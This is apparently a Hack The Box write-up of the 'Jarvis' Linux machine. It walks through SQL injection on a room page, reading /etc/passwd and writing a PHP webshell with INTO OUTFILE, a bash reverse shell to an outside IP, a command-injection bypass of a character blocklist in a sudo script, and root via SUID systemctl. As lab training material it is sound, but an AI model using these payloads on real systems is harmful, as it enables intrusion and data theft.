@@ -1,0 +1,198 @@
+Jarvis
+
+09t h September 2019 / Document No D19.100.44
+
+Prepared By: MinatoTW
+Machine Author: manulqwerty & Ghostpp7
+Difficulty: M edium
+Classification: Official
+
+                                                                        Page 1 / 16
+SYNOPSIS
+
+Jarvis is a medium difficulty Linux box running a web server, which has DoS and brute force
+protection enabled. A page is found to be vulnerable to SQL injection, which requires manual
+exploitation. This service allows the writing of a shell to the web root for the foothold. The www
+user is allowed to execute a script as another user, and the script is vulnerable to command
+injection. On further enumeration, systemctl is found to have the SUID bit set, which is leveraged
+to gain a root shell.
+
+Skills Required         Skills Learned
+
+     SQL injection           File writes through SQL injection
+     Linux Enumeration       Exploiting systemctl GTFObin
+     Command injection
+
+                        Page 2 / 16
+ENUMERATION
+NMAP
+
+ ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.143 | grep ^[0-9] | cut -d '/' -f 1 |
+ tr '\n' ',' | sed s/,$//)
+ nmap -sC -sV -p $ports 10.10.10.143
+
+We see SSH and HTTP running on their default ports. Additionally, there's an HTTP server
+running on port 64999.
+
+                                                                                                                  Page 3 / 16
+APACHE
+
+Navigating to the Apache server on port 80 we come across a page titled "Stark Hotel".
+The page displays a vhost "supersecurehotel.htb", which is added to the hosts file. Running
+gobuster on the server results in the following message:
+This makes it hard to perform any kind of scanning on the server. Browsing to port 64999 we see
+the same message. Clicking on the "Rooms" tab on the page takes us to /room-suites.php.
+
+                                                                                                                  Page 4 / 16
+Clicking on the "Book now!" button opens up a new URL with a query named "cod".
+ http://10.10.10.143/room.php?cod=1
+The page displays a particular room based on the value of the parameter.
+
+                                                                                                                  Page 5 / 16
+Let's try to test parameter for SQL injection. Adding a quote and comment to the value results in
+an empty response.
+
+However, on removing the quote and retrying, the room image is returned. We can infer from this
+that the server expects an integer for the parameter, and that it is SQL injectable.
+
+                                                                                                                  Page 6 / 16
+This can be verified by using a true and false clause. For example:
+
+ 10.10.10.143/room.php?cod=1 and 1=1-- -
+
+The above URL results in a true and true clause resulting in a true result overall and the room is
+returned. But if we use a true and false clause like:
+
+ 10.10.10.143/room.php?cod=1 and 1=2-- -
+This results in a false value which fails to return the room.
+
+SQL Injection
+
+Now that we have confirmed SQL injection, let's try to extract information through a union based
+SQL injection. We can use the "ORDER BY" keyword to find the number of columns.
+
+ http://10.10.10.143/room.php?cod=1 order by 5
+The URL above returns the room which means the table has either 5 columns or more. On
+incrementing the value by 1 each time, we find that no room is return for the value 8 which means
+that the table has 7 columns.
+Now we can use union based queries in order to find the injectable columns.
+ http://10.10.10.143/room.php?cod=-1 union select 1,2,3,4,5,6,7
+
+                                                                                                                  Page 7 / 16
+We use the negative value to prevent the room being selected over our values. Trying the URL
+above returns:
+
+We see the values 5, 2, 3 and 4 in the output which can be used for injection.
+Let's check the database version and the user we are running as.
+ http://10.10.10.143/room.php?cod=-1 union select 1,database(),user(),4,5,6,7
+
+The server is MariaDB, and we're running as the DBadmin user. Let's check if we can read files
+using the load_file() function.
+
+                                                                                                                  Page 8 / 16
+ http://10.10.10.143/room.php?cod=-1 union select
+ 1,load_file('/etc/passwd'),3,4,5,6,7
+Requesting the URL above, we see that the contents of passwd are returned.
+
+Let's also check if we can write files to the server. We can inspect the apache configuration to
+identify the path of the webroot. Ideally, the apache2 configuration is located at
+/etc/apache2/sites-enabled/000-default.conf.
+
+The path is configured with the default path /var/www/html. In MySQL, we can write files using
+the "INTO OUTFILE" keyword. Let's try writing contents of passwd to a file in the web root.
+
+                                                                                                                  Page 9 / 16
+ http://10.10.10.143/room.php?cod=-1 union select
+ 1,load_file('/etc/passwd'),3,4,5,6,7 into outfile '/var/www/html/hacked.txt'
+The above query writes the contents of passwd to a file named hacked.txt. After requesting the
+URL and browsing to /hacked.txt, we see the contents of /etc/passwd.
+
+                                                                                                                 Page 10 / 16
+FOOTHOLD
+
+Next, let's write a webshell.
+ http://10.10.10.143/room.php?cod=-1 union select 1,'<?php
+ system($_REQUEST["exec"]);?>',3,4,5,6,7 into outfile '/var/www/html/pwned.php'
+After requesting the above URL, we can use the "exec" parameter to execute commands on the
+server.
+
+A bash reverse shell can be executed to gain a reverse shell.
+ curl -X POST http://10.10.10.143/pwned.php --data-urlencode 'exec=bash -c
+ "bash -i >& /dev/tcp/10.10.14.4/1234 0>&1"'
+
+                                                                                                                 Page 11 / 16
+LATERAL MOVEMENT
+
+Looking at the sudo permissions for www-data, we see that it can execute simpler.py as the user
+pepper.
+
+Looking at the script, we see that it takes an IP address on using the -p argument, and then uses
+the os.system() function to execute ping.
+
+ def e xec_ping( ):
+            forbidden = [' &', ';', ' -', ' `', ' ||', ' |']
+            command = input('Enter an IP: ')
+            for i in forbidden:
+            if i i n command:
+                       print('Got you')
+                       exit()
+            os.system(' ping ' + command)
+
+ if __name__ == '__main__':
+            show_header()
+
+ <SNIP>
+            elif sys.argv[1] == '-p':
+            exec_ping()
+            exit()
+            else:
+            show_help()
+            exit()
+
+                                                                                                                 Page 12 / 16
+A few characters (& ; - ` |) are blocked by the script, in order to prevent injection. But the
+characters `$' , `(` and `)' aren't blocked. This will let us inject commands through bash command
+substitution i.e "$ (cmd)". Let's check if it works using the script.
+
+We see that the command was substituted by the username "pepper", and ping tried resolving it
+as a hostname. This means that the command execution was successful. We can use this to
+execute a bash reverse shell, and gain a shell as pepper. As some special characters are
+blocked, we'll write the command to a script and execute it through the injection.
+
+                                                                                                                 Page 13 / 16
+PRIVILEGE ESCALATION
+
+After executing the script, a shell as pepper is received.
+
+After enumerating SUID files, we see systemctl which isn't an SUID by default.
+
+The systemctl command is used to manage services on a system running systemd. Usually, the
+configuration files are located are /etc/system/systemd. However, as we're not root, it's not
+possible to write a file to this folder. Instead, we can use the systemctl link command.
+According to the manpage h ere, the link command can be used to include a configuration file
+that isn't in the default search path. This will help us create a unit file at any location and link it,
+which will let us start the service.
+
+                                                                                                                 Page 14 / 16
+ link PATH...
+ Link a unit file that is not in the unit file search paths into the unit file
+ search path. This command expects an absolute path to a unit file. The effect of
+ this may be undone with disable. The effect of this command is that a unit file is
+ made available for commands such as start, even though it is not installed directly
+ in the unit search path.
+Checking GTFObins, we see how this can be leveraged to execute commands.
+
+The commands above create a file named pwn.service with service of type "oneshot". The
+oneshot service waits until the initial command has executed, before declaring the service active.
+The "ExecStart" parameter is used to specify the command which is to be executed on start.
+Then the link command is used to link the service to systemd, and the start command is used to
+execute the command.
+
+                                                                                                                 Page 15 / 16
+The output of the "id" command is seen in the file /tmp/output, which confirms that it runs as root.
+Similarly, we can create another service which executes a reverse shell for us.
+
+The service executes the script shell.sh which was created earlier and gives a root shell.
+
+                                                                                                                 Page 16 / 16
+
